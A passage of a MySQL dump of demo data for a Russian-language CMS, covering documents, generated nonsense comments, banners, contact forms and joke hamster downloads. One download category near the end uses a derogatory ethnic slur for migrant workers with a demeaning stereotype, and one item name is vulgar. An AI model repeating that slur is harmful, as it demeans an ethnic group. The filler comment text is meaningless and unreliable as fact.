позволяет оформлять покупки как авторизованным пользователям, так и неавторизованным. Авторизованные пользователи могут сравнивать понравившееся им товары товары. Также для авторизованных пользователей предусмотрена лидкая система скидок и купонов. Модуль обладает отличными SEO-показателями и позволяет оперировать всеми необходимыми meta-тегами.</p>\r\n</div>\r\n</div>\r\n</div>\r\n</div>', '1');
INSERT INTO `cp_document_fields` VALUES (54, 31, 17, '', '1');
INSERT INTO `cp_document_fields` VALUES (55, 29, 17, 'Типографика', '1');
INSERT INTO `cp_document_fields` VALUES (56, 30, 18, '<p>[tag:hide:1]Этот текст скрыт от&nbsp;админов[/tag:hide][tag:hide:2]Этот текст скрыт от&nbsp;гостей[/tag:hide]</p>\r\n<p>В&nbsp;основе шаблона лежит блочная верстка по&nbsp;системе &laquo;960px grid system&raquo;.<br />\r\n<br />\r\n<a href="index.php?id=5&amp;doc=kontakty">index.php?id=5&amp;doc=kontakty</a><br />\r\n[mod_contact:2]</p>', '0');
INSERT INTO `cp_document_fields` VALUES (57, 31, 18, 'uploads/images/h1.gif', '0');
INSERT INTO `cp_document_fields` VALUES (58, 29, 18, '960px grid system', '0');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_document_remarks`
-- 

CREATE TABLE `cp_document_remarks` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `document_id` int(10) unsigned NOT NULL default '0',
  `remark_first` enum('0','1') NOT NULL default '0',
  `remark_title` varchar(255) NOT NULL,
  `remark_text` text NOT NULL,
  `remark_author_id` int(10) unsigned NOT NULL default '1',
  `remark_published` int(10) unsigned NOT NULL default '0',
  `remark_status` enum('1','0') NOT NULL default '1',
  `remark_author_email` varchar(255) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_document_remarks`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_documents`
-- 

CREATE TABLE `cp_documents` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `rubric_id` mediumint(5) unsigned NOT NULL default '0',
  `document_alias` varchar(255) NOT NULL,
  `document_title` varchar(255) NOT NULL,
  `document_published` int(10) unsigned NOT NULL default '0',
  `document_expire` int(10) unsigned NOT NULL default '0',
  `document_changed` int(10) unsigned NOT NULL default '0',
  `document_author_id` mediumint(5) unsigned NOT NULL default '1',
  `document_in_search` enum('1','0') NOT NULL default '1',
  `document_meta_keywords` tinytext NOT NULL,
  `document_meta_description` tinytext NOT NULL,
  `document_meta_robots` enum('index,follow','index,nofollow','noindex,nofollow') NOT NULL default 'index,follow',
  `document_status` enum('1','0') NOT NULL default '1',
  `document_deleted` enum('0','1') NOT NULL default '0',
  `document_count_print` int(10) unsigned NOT NULL default '0',
  `document_count_view` int(10) unsigned NOT NULL default '0',
  `document_linked_navi_id` mediumint(5) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `document_alias` (`document_alias`),
  KEY `rubric_id` (`rubric_id`),
  KEY `document_status` (`document_status`),
  KEY `document_published` (`document_published`),
  KEY `document_expire` (`document_expire`)
) ENGINE=MyISAM AUTO_INCREMENT=19 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_documents`
-- 

INSERT INTO `cp_documents` VALUES (1, 1, 'главная', 'Главная', 0, 0, 1276002455, 1, '0', '', '', 'index,follow', '1', '0', 10, 1065, 0);
INSERT INTO `cp_documents` VALUES (2, 1, '404-not-found', '404 - Документ не найден', 0, 0, 1258259536, 1, '0', '', '', 'noindex,nofollow', '1', '0', 5, 306, 1);
INSERT INTO `cp_documents` VALUES (3, 1, 'о-компании', 'О компании', 1250047140, 1881199140, 1275880968, 1, '0', '', '', 'index,follow', '1', '0', 0, 164, 0);
INSERT INTO `cp_documents` VALUES (4, 1, 'условия-сделки', 'Условия сделки', 1250986260, 1882138260, 1276918295, 1, '1', '', '', 'index,follow', '1', '0', 1, 75, 0);
INSERT INTO `cp_documents` VALUES (5, 1, 'kontakty', 'Контакты', 1251677460, 1882829460, 1276370714, 1, '1', '', '', 'index,follow', '1', '0', 0, 156, 0);
INSERT INTO `cp_documents` VALUES (6, 2, 'новости/2009-08-07/первая-тестовая-новость', 'Первая тестовая новость', 1249258200, 1880410200, 1275882565, 1, '1', 'Новость', '', 'index,follow', '1', '0', 1, 211, 0);
INSERT INTO `cp_documents` VALUES (7, 1, 'новости', 'Архив новостей', 1251331860, 1882483860, 1278066151, 1, '1', 'Архив новостей', '', 'index,follow', '1', '0', 1, 164, 0);
INSERT INTO `cp_documents` VALUES (8, 2, 'новости/2009-08-15/вторая-тестовая-новость', 'Вторая тестовая новость', 1250035860, 1881187860, 1275822034, 1, '1', 'Новость 2,тестовая новость 2', '', 'index,follow', '1', '0', 0, 124, 0);
INSERT INTO `cp_documents` VALUES (9, 1, 'primer-galerei', 'Пример галереи', 1250986260, 1882138260, 1275883042, 1, '1', 'Галерея,картинки,изображения', '', 'index,follow', '1', '0', 2, 148, 0);
INSERT INTO `cp_documents` VALUES (10, 1, 'faq', 'FAQ', 1249085460, 1880237460, 1275882529, 1, '1', 'вопрос-ответ', 'работа модуля вопрос-ответ', 'index,follow', '1', '0', 0, 75, 0);
INSERT INTO `cp_documents` VALUES (11, 1, 'sitemap', 'Карта сайта', 1258400700, 1889552700, 1275822225, 1, '0', '', '', 'index,follow', '1', '0', 1, 41, 1);
INSERT INTO `cp_documents` VALUES (12, 1, 'kopiya-mordy', 'Копия морды', 1258427100, 1889579100, 1273609180, 1, '1', '', '', 'index,follow', '1', '0', 0, 9, 0);
INSERT INTO `cp_documents` VALUES (13, 1, 'google-maps', 'Google Maps', 1264240740, 1895392740, 1275822247, 1, '1', '', '', 'index,follow', '1', '0', 0, 11, 0);
INSERT INTO `cp_documents` VALUES (14, 2, 'новости/демонстрация-тэга-more', 'Демонстрация тэга more', 1263292140, 1894444140, 1274572572, 1, '1', '', '', 'index,follow', '1', '0', 0, 13, 5);
INSERT INTO `cp_documents` VALUES (15, 2, 'новости/диссонансный-ритм-актуальная-национальная-задача', 'Диссонансный ритм — актуальная национальная задача', 1263302280, 1894454280, 1274572608, 2, '1', '«Диссонансный ритм — <акту\\аль/ная> "национальная" зад''ача»-2', '«Диссонансный ритм — <акту\\аль/ная> "национальная" зад''ача»-3', 'index,follow', '1', '0', 0, 14, 5);
INSERT INTO `cp_documents` VALUES (16, 1, 'osobennosti-shablona', 'Особенности шаблона', 1263322080, 1894474080, 1272800885, 2, '1', 'Особенности шаблона', 'Особенности шаблона', 'index,follow', '1', '0', 0, 21, 0);
INSERT INTO `cp_documents` VALUES (17, 3, 'tipografika', 'Типографика', 1263322320, 1894474320, 1272800389, 2, '1', 'Типографика', 'Типографика', 'index,follow', '1', '0', 0, 24, 0);
INSERT INTO `cp_documents` VALUES (18, 3, '960px-grid-system', '960px grid system', 1265461800, 949842600, 1278344340, 2, '0', '', '', 'index,follow', '1', '0', 0, 34, 0);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_log`
-- 

CREATE TABLE `cp_log` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `log_time` int(10) NOT NULL default '0',
  `log_ip` varchar(25) NOT NULL,
  `log_url` varchar(255) NOT NULL,
  `log_text` text NOT NULL,
  `log_type` tinyint(1) unsigned NOT NULL default '2',
  `log_rubric` tinyint(1) unsigned NOT NULL default '2',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_log`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_banner_categories`
-- 

CREATE TABLE `cp_modul_banner_categories` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `banner_category_name` char(100) NOT NULL default '',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_banner_categories`
-- 

INSERT INTO `cp_modul_banner_categories` VALUES (1, 'Катагория 1');
INSERT INTO `cp_modul_banner_categories` VALUES (2, 'Категория 2');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_banners`
-- 

CREATE TABLE `cp_modul_banners` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `banner_category_id` smallint(3) unsigned NOT NULL default '1',
  `banner_file_name` char(255) NOT NULL default '',
  `banner_url` char(255) NOT NULL default '',
  `banner_priority` enum('0','1','2','3') NOT NULL default '0',
  `banner_name` char(100) NOT NULL default '',
  `banner_views` mediumint(5) unsigned NOT NULL default '0',
  `banner_clicks` mediumint(5) unsigned NOT NULL default '0',
  `banner_alt` char(255) NOT NULL default '',
  `banner_max_clicks` mediumint(5) unsigned NOT NULL default '0',
  `banner_max_views` mediumint(5) unsigned NOT NULL default '0',
  `banner_show_start` tinyint(1) unsigned NOT NULL default '0',
  `banner_show_end` tinyint(1) unsigned NOT NULL default '0',
  `banner_status` enum('1','0') NOT NULL default '1',
  `banner_target` enum('_blank','_self') NOT NULL default '_blank',
  `banner_width` smallint(3) unsigned NOT NULL default '0',
  `banner_height` smallint(3) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  KEY `banner_category_id` (`banner_category_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_banners`
-- 

INSERT INTO `cp_modul_banners` VALUES (1, 1, 'banner.jpg', 'http://www.overdoze.ru', '1', 'Overdoze-Banner', 128, 0, 'Скрипты CMS, бесплатные шаблоны, форум и поддержка разработчиков', 0, 0, 0, 0, '1', '_self', 0, 0);
INSERT INTO `cp_modul_banners` VALUES (2, 1, 'banner2.gif', 'http://www.google.de', '1', 'Google-Banner', 111, 0, 'Посетите сайт Google', 0, 0, 0, 0, '1', '_blank', 0, 0);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_comment_info`
-- 

CREATE TABLE `cp_modul_comment_info` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `parent_id` int(10) unsigned NOT NULL default '0',
  `document_id` int(10) unsigned NOT NULL default '0',
  `comment_author_name` varchar(255) NOT NULL,
  `comment_author_id` int(10) unsigned NOT NULL default '0',
  `comment_author_email` varchar(255) NOT NULL,
  `comment_author_city` varchar(255) NOT NULL,
  `comment_author_website` varchar(255) NOT NULL,
  `comment_author_ip` varchar(15) NOT NULL,
  `comment_published` int(10) unsigned NOT NULL default '0',
  `comment_changed` int(10) unsigned NOT NULL default '0',
  `comment_text` text NOT NULL,
  `comment_status` tinyint(1) unsigned NOT NULL default '1',
  `comments_close` tinyint(1) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  KEY `document_id` (`document_id`),
  KEY `parent_id` (`parent_id`),
  KEY `status` (`comment_status`)
) ENGINE=MyISAM AUTO_INCREMENT=19 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_modul_comment_info`
-- 

INSERT INTO `cp_modul_comment_info` VALUES (1, 0, 6, 'Д. Д''артаньяновский', 2, 'admin@ave.ru', '', '', '127.0.0.1', 1269959742, 0, 'Можно предположить, что вероятностная логика создает язык образов, при этом буквы А, В, I, О символизируют соответственно общеутвердительное, общеотрицательное, частноутвердительное и частноотрицательное суждения. Локаята осмысленно принимает во внимание интеллект, хотя в официозе принято обратное. Гений ментально контролирует из ряда вон выходящий бабувизм, при этом буквы А, В, I, О символизируют соответственно общеутвердительное, общеотрицательное, частноутвердительное и частноотрицательное суждения. Сомнение принимает во внимание субъективный гравитационный парадокс, не учитывая мнения авторитетов. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (2, 0, 6, 'Admin', 1, 'admin@ave.ru', '', '', '127.0.0.1', 1269959769, 0, 'Интеллект транспонирует примитивный здравый смысл, хотя в официозе принято обратное. Априори, гегельянство подрывает бабувизм, однако Зигварт считал критерием истинности необходимость и общезначимость, для которых нет никакой опоры в объективном мире. Освобождение, конечно, непредсказуемо. По своим философским взглядам Дезами был материалистом и атеистом, последователем Гельвеция, однако даосизм рефлектирует гравитационный парадокс, изменяя привычную реальность. Гедонизм решительно контролирует трагический гравитационный парадокс, учитывая опасность, которую представляли собой писания Дюринга для не окрепшего еще немецкого рабочего движения. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (3, 1, 6, 'Admin', 1, 'admin@ave.ru', '', '', '127.0.0.1', 1269959796, 1269974114, 'Свобода, следовательно, рассматривается данный гений, изменяя привычную реальность. Язык образов осмысляет мир, tertium nоn datur. Априори, надстройка создает сложный гений, открывая новые горизонты. Суждение, конечно, преобразует смысл жизни, не учитывая мнения авторитетов. Философия порождает и обеспечивает примитивный здравый смысл, отрицая очевидное. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (4, 3, 6, 'Д. Д''артаньяновский', 2, 'admin@ave.ru', '', '', '127.0.0.1', 1269959821, 0, 'Заблуждение поразительно. Гносеология естественно рефлектирует дуализм, не учитывая мнения авторитетов. Согласно предыдущему, бабувизм подрывает гравитационный парадокс, открывая новые горизонты. Созерцание нетривиально. Эклектика рефлектирует напряженный позитивизм, однако Зигварт считал критерием истинности необходимость и общезначимость, для которых нет никакой опоры в объективном мире. Смысл жизни индуктивно творит естественный мир, открывая новые горизонты. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (5, 4, 6, 'Admin', 1, 'admin@ave.ru', '', '', '127.0.0.1', 1269959843, 0, 'Сомнение подчеркивает принцип восприятия, открывая новые горизонты. Платоновская академия откровенна. Импликация изоморфна времени. Можно предположить, что генетика рефлектирует трагический интеллект, изменяя привычную реальность. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (6, 2, 6, 'Д. Д''артаньяновский', 2, 'admin@ave.ru', '', '', '127.0.0.1', 1269960075, 0, 'По своим философским взглядам Дезами был материалистом и атеистом, последователем Гельвеция, однако смысл жизни методологически принимает во внимание закон внешнего мира, открывая новые горизонты. Принцип восприятия дискредитирует интеллигибельный дедуктивный метод, при этом буквы А, В, I, О символизируют соответственно общеутвердительное, общеотрицательное, частноутвердительное и частноотрицательное суждения. Гений решительно порождает и обеспечивает смысл жизни, изменяя привычную реальность. Бабувизм прост. Искусство амбивалентно. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (7, 1, 6, 'Admin', 1, 'admin@ave.ru', '', '', '127.0.0.1', 1269959978, 1269977724, 'Наряду с этим интеллект осмысленно трансформирует дуализм, учитывая опасность, которую представляли собой писания Дюринга для не окрепшего еще немецкого рабочего движения. Философия, как принято считать, нетривиальна. Гегельянство трансформирует даосизм, открывая новые горизонты. Моцзы, Сюнъцзы и другие считали, что гений абстрактен. Созерцание поразительно. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (8, 4, 6, 'Admin', 1, 'admin@ave.ru', '', '', '127.0.0.1', 1269960028, 0, 'Сомнение рассматривается напряженный гравитационный парадокс, учитывая опасность, которую представляли собой писания Дюринга для не окрепшего еще немецкого рабочего движения. Смысл жизни, следовательно, прост. Дедуктивный метод, конечно, оспособляет знак, ломая рамки привычных представлений. Деонтология рассматривается интеллигибельный здравый смысл, хотя в официозе принято обратное. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (9, 5, 6, 'User', 2, 'user@ave.ru', '', '', '127.0.0.1', 1269963278, 0, 'Ответ пользователя', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (11, 0, 8, 'Д. Д''артаньяновский', 1, 'admin@ave.ru', 'пла"нета Зе''мля', 'ave.ru', '127.0.0.1', 1274222936, 1274223200, 'В связи с этим нужно подчеркнуть, что реликтовый ледник гасит астероидный ионный хвост — это солнечное затмение предсказал ионянам Фалес Милетский. Маятник Фуко притягивает Юпитер, хотя для имеющих глаза-телескопы  ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (15, 11, 8, 'Прохожий', 0, 'outsider@ave.ru', '', '', '127.0.0.1', 1275691927, 0, 'Шаблоны Fluid 960 Grid System построены на базе работ Натан Смит и его 960 Grid System, с использыванием эффектов MooTools и jQuery  JavaScript библиотек. Идея создания этих шаблонов принадлежит Энди Кларк, автору Transcending CSS, who advocates a content-out approach to rapid interactive prototyping, crediting Jason Santa Maria with the grey box method.', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (12, 0, 8, 'Д. Д''артаньяновский', 1, 'admin@ave.ru', 'пла"нета Зе''мля', 'ave.ru', '127.0.0.1', 1274223154, 1274223272, 'туманность Андромеды показалась бы на небе величиной с треть ковша Большой Медведицы. Бесспорно, аномальная джетовая активность традиционно выслеживает эллиптический дип-скай объект, тем не менее, Дон Еманс включил в список всего 82-е Великие Кометы. По космогонической гипотезе Джеймса Джинса, полнолуние вызывает азимут, выслеживая яркие, броские образования.', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (16, 11, 8, 'Прохожий', 0, 'outsider@ave.ru', '', '', '127.0.0.1', 1275692456, 0, 'Шаблоны Fluid 960 Grid System построены на базе работ Натан Смит и его 960 Grid System, с использыванием эффектов MooTools и jQuery  JavaScript библиотек. Идея создания этих шаблонов принадлежит Энди Кларк, автору Transcending CSS, who advocates a content-out approach to rapid interactive prototyping, crediting Jason Santa Maria with the grey box method.', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (17, 15, 8, 'Д. А''дмин', 1, 'admin@ave.ru', '', '', '127.0.0.1', 1275692682, 0, 'Шаблоны Fluid 960 Grid System построены на базе работ Натан Смит и его 960 Grid System, с использыванием эффектов MooTools и jQuery  JavaScript библиотек. Идея создания этих шаблонов принадлежит Энди Кларк, автору Transcending CSS, who advocates a content-out approach to rapid interactive prototyping, crediting Jason Santa Maria with the grey box method.', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (18, 17, 8, 'Д. А''дмин', 0, 'admin@ave.ru', '', '', '127.0.0.1', 1275694601, 0, 'В связи с этим нужно подчеркнуть, что реликтовый ледник гасит астероидный ионный хвост — это солнечное затмение предсказал ионянам Фалес Милетский. Маятник Фуко притягивает Юпитер, хотя для имеющих глаза-телескопы\nВ связи с этим нужно подчеркнуть, что реликтовый ледник гасит астероидный ионный хвост — это солнечное затмение предсказал ионянам Фалес Милетский. Маятник Фуко притягивает Юпитер, хотя для имеющих глаза-телескопы', 1, 0);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_comments`
-- 

CREATE TABLE `cp_modul_comments` (
  `Id` tinyint(1) unsigned NOT NULL auto_increment,
  `comment_max_chars` smallint(3) unsigned NOT NULL default '1000',
  `comment_user_groups` char(255) NOT NULL,
  `comment_need_approve` enum('0','1') NOT NULL default '0',
  `comment_active` enum('1','0') NOT NULL default '1',
  `comment_use_antispam` enum('1','0') NOT NULL default '1',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_comments`
-- 

INSERT INTO `cp_modul_comments` VALUES (1, 1500, '1,2,3,4', '0', '1', '1');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_contact_fields`
-- 

CREATE TABLE `cp_modul_contact_fields` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `contact_form_id` mediumint(5) unsigned NOT NULL default '0',
  `contact_field_type` varchar(25) NOT NULL default 'text',
  `contact_field_position` smallint(3) unsigned NOT NULL default '10',
  `contact_field_title` tinytext NOT NULL,
  `contact_field_required` enum('0','1') NOT NULL default '0',
  `contact_field_default` longtext NOT NULL,
  `contact_field_status` enum('1','0') NOT NULL default '1',
  `contact_field_size` smallint(3) unsigned NOT NULL default '300',
  `contact_field_newline` enum('1','0') NOT NULL default '1',
  `contact_field_datatype` enum('anysymbol','onlydecimal','onlychars') NOT NULL default 'anysymbol',
  `contact_field_max_chars` varchar(20) NOT NULL,
  `contact_field_value` varchar(255) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_contact_fields`
-- 

INSERT INTO `cp_modul_contact_fields` VALUES (1, 1, 'textfield', 5, 'Сообщение', '1', '', '1', 698, '1', 'anysymbol', '', '');
INSERT INTO `cp_modul_contact_fields` VALUES (2, 1, 'dropdown', 50, 'Как Вы оцените наш сайт?', '0', 'Плохо,Средне,Супер,Очень мега круто', '1', 200, '1', 'anysymbol', '', '');
INSERT INTO `cp_modul_contact_fields` VALUES (3, 1, 'fileupload', 50, 'Прикрепить файл', '1', '', '1', 600, '1', 'anysymbol', '', '');
INSERT INTO `cp_modul_contact_fields` VALUES (4, 1, 'fileupload', 50, 'Прикрепить файл', '0', '', '1', 600, '1', 'anysymbol', '', '');
INSERT INTO `cp_modul_contact_fields` VALUES (5, 1, 'checkbox', 55, 'Чекбокс', '1', 'Чекбокс деф', '1', 300, '1', 'anysymbol', '', 'Не заполнено обязательное поле');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_contact_info`
-- 

CREATE TABLE `cp_modul_contact_info` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `contact_form_number` varchar(20) NOT NULL,
  `contact_form_id` mediumint(5) unsigned NOT NULL default '0',
  `contact_form_in_date` int(10) unsigned NOT NULL default '0',
  `contact_form_in_email` varchar(255) NOT NULL,
  `contact_form_in_subject` varchar(255) NOT NULL,
  `contact_form_in_message` longtext NOT NULL,
  `contact_form_in_attachment` tinytext NOT NULL,
  `contact_form_out_date` int(10) unsigned NOT NULL default '0',
  `contact_form_out_email` varchar(255) NOT NULL,
  `contact_form_out_sender` varchar(255) NOT NULL,
  `contact_form_out_message` longtext NOT NULL,
  `contact_form_out_attachment` tinytext NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_contact_info`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_contacts`
-- 

CREATE TABLE `cp_modul_contacts` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `contact_form_title` varchar(100) NOT NULL,
  `contact_form_mail_max_chars` smallint(3) unsigned NOT NULL default '20000',
  `contact_form_receiver` varchar(100) NOT NULL,
  `contact_form_receiver_multi` varchar(255) NOT NULL,
  `contact_form_antispam` enum('1','0') NOT NULL default '1',
  `contact_form_max_upload` mediumint(5) unsigned NOT NULL default '500',
  `contact_form_subject_show` enum('1','0') NOT NULL default '1',
  `contact_form_subject_default` varchar(255) NOT NULL default 'Сообщение',
  `contact_form_allow_group` varchar(255) NOT NULL default '1,2,3,4',
  `contact_form_send_copy` enum('1','0') NOT NULL default '1',
  `contact_form_message_noaccess` text NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_contacts`
-- 

INSERT INTO `cp_modul_contacts` VALUES (1, 'Обратная Связь', 5000, 'formsg@mail.ru', '', '1', 120, '0', '', '1,2,3,4', '0', 'У Вас недостаточно прав для использования этой формы.');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_download_comments`
-- 

CREATE TABLE `cp_modul_download_comments` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `FileId` int(10) unsigned NOT NULL default '0',
  `Datum` int(14) unsigned NOT NULL default '0',
  `title` varchar(100) NOT NULL,
  `comment_text` text NOT NULL,
  `Name` varchar(100) NOT NULL default '',
  `Email` varchar(100) NOT NULL default '',
  `Ip` varchar(200) NOT NULL default '',
  `Aktiv` tinyint(1) unsigned NOT NULL default '1',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_download_comments`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_download_files`
-- 

CREATE TABLE `cp_modul_download_files` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Autor` varchar(255) default NULL,
  `AutorUrl` varchar(255) default NULL,
  `Version` varchar(255) default NULL,
  `Sprache` varchar(255) default '1',
  `KatId` int(10) unsigned NOT NULL default '1',
  `Name` varchar(255) NOT NULL default '',
  `description` text NOT NULL,
  `Limitierung` text,
  `status` tinyint(1) unsigned NOT NULL default '1',
  `Methode` enum('ftp','http','local') NOT NULL default 'local',
  `Pfad` varchar(255) NOT NULL default '',
  `Downloads` int(10) unsigned NOT NULL default '0',
  `Groesse` int(14) unsigned NOT NULL default '0',
  `GroesseEinheit` enum('kb','mb') NOT NULL default 'kb',
  `Datum` int(14) unsigned NOT NULL default '0',
  `Geaendert` int(14) unsigned default NULL,
  `Os` varchar(255) NOT NULL default '1',
  `Lizenz` mediumint(2) default NULL,
  `Wertung` enum('1','2','3','4','5') NOT NULL default '5',
  `Wertungen_top` int(14) unsigned NOT NULL default '0',
  `Wertungen_flop` int(14) unsigned NOT NULL default '0',
  `Wertungen_ip` text NOT NULL,
  `Wertungen_ja` tinyint(1) unsigned NOT NULL default '1',
  `RegGebuehr` varchar(200) default NULL,
  `Mirrors` text,
  `Screenshot` varchar(255) default NULL,
  `Autor_Erstellt` int(14) unsigned NOT NULL default '1',
  `Autor_Geandert` int(10) unsigned NOT NULL default '1',
  `Kommentar_ja` int(10) unsigned NOT NULL default '1',
  `Downloads_Max` int(10) unsigned NOT NULL default '0',
  `Pay` varchar(10) default '0',
  `Pay_val` int(10) unsigned NOT NULL default '0',
  `Pay_Type` smallint(2) unsigned NOT NULL default '0',
  `Only_Pay` tinyint(1) unsigned NOT NULL default '1',
  `Excl_Pay` tinyint(1) unsigned NOT NULL default '0',
  `Excl_Chk` tinyint(1) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_download_files`
-- 

INSERT INTO `cp_modul_download_files` VALUES (8, 'Overdoze', '', '5.0', '1', 31, 'Мегахомяк', '<p>Хомяк (Cricetus), род грызунов, сем. мышиных; толстое, неуклюж. тело, коротк. хвост и ноги; большие защечные мешки; выкапывает норы со сложн. системой ходов; пит. семенами, вреден; самка приносит дважды в год от 6 до 12 детенышей. Обыкновенный (C. vulgaris) в восточной Европе; песочный (C. arenarius) в песчан. местн. по Волге, Уралу и Иртышу; зюнгарский (C. songarus), главным образом, по бер. Иртыша.</p>', 'Нет ограницений', 1, 'local', 'Changelog.pdf', 450, 0, 'kb', 1164046575, 1232403514, '8', 3, '5', 32, 5, '', 1, 'Нету', '\r\nhttp://www.domain.ru', '/uploads/downloads/hamster1.jpg', 1, 1, 1, 5, '45', 1, 0, 1, 0, 0);
INSERT INTO `cp_modul_download_files` VALUES (11, '', '', '12', '1', 30, 'Суперхомяк', 'Хомяк (Cricetus), род грызунов, сем. мышиных; толстое, неуклюж. тело, коротк. хвост и ноги; большие защечные мешки; выкапывает норы со сложн. системой ходов; пит. семенами, вреден; самка приносит дважды в год от 6 до 12 детенышей. Обыкновенный (C. vulgaris) в восточной Европе; песочный (C. arenarius) в песчан. местн. по Волге, Уралу и Иртышу; зюнгарский (C. songarus), главным образом, по бер. Иртыша.', '&nbsp;', 1, 'local', 'HandbuchKoobi5.pdf', 69, 0, 'kb', 1164047584, 1232403523, '9', 3, '5', 20, 3, '', 1, '', '', '/uploads/downloads/hamster5.jpg', 1, 1, 1, 0, '12', 1, 0, 1, 0, 0);
INSERT INTO `cp_modul_download_files` VALUES (12, '', 'www.bitmap.ru', '1', '1', 28, 'Охуе-хомяк', 'Хомяк (Cricetus), род грызунов, сем. мышиных; толстое, неуклюж. тело, коротк. хвост и ноги; большие защечные мешки; выкапывает норы со сложн. системой ходов; пит. семенами, вреден; самка приносит дважды в год от 6 до 12 детенышей. Обыкновенный (C. vulgaris) в восточной Европе; песочный (C. arenarius) в песчан. местн. по Волге, Уралу и Иртышу; зюнгарский (C. songarus), главным образом, по бер. Иртыша.', '&nbsp;', 1, 'local', 'Changelog.pdf', 0, 0, 'kb', 1232403638, NULL, '3', 1, '2', 0, 0, '', 1, '', '', '/uploads/downloads/hamster4.jpg', 1, 1, 1, 0, '4', 1, 0, 1, 0, 0);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_modul_download_kat`
-- 

CREATE TABLE `cp_modul_download_kat` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `parent_id` int(10) unsigned NOT NULL default '0',
  `KatName` varchar(255) NOT NULL default '',
  `position` int(8) unsigned NOT NULL default '1',
  `KatBeschreibung` text NOT NULL,
  `user_group` varchar(255) NOT NULL default '1|2|3|4|5|6',
  `Bild` varchar(200) default NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=32 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_modul_download_kat`
-- 

INSERT INTO `cp_modul_download_kat` VALUES (24, 0, 'Боевые хомяки', 1, '', '1|12|6|2|8|7|4|5|11|3', 'koobi.gif');
INSERT INTO `cp_modul_download_kat` VALUES (25, 24, 'Самки', 1, 'Здесь собраны фотографии самок хомяков', '1|2|4|3', '');
INSERT INTO `cp_modul_download_kat` VALUES (26, 24, 'Самцы', 2, 'Здесь представлены самцы этого грозного жывотнаго', '1|2|4|3', '');
INSERT INTO `cp_modul_download_kat` VALUES (27, 0, 'Рабочие хомяки', 1, 'Здесь собраны все возможные хомяки трутни', '1|2|4|3', '');
INSERT INTO `cp_modul_download_kat` VALUES (28, 27, 'Хомяки джумшуты', 1, 'работают быстро и дешево но неквалифицированно', '1|2|4|3', '');
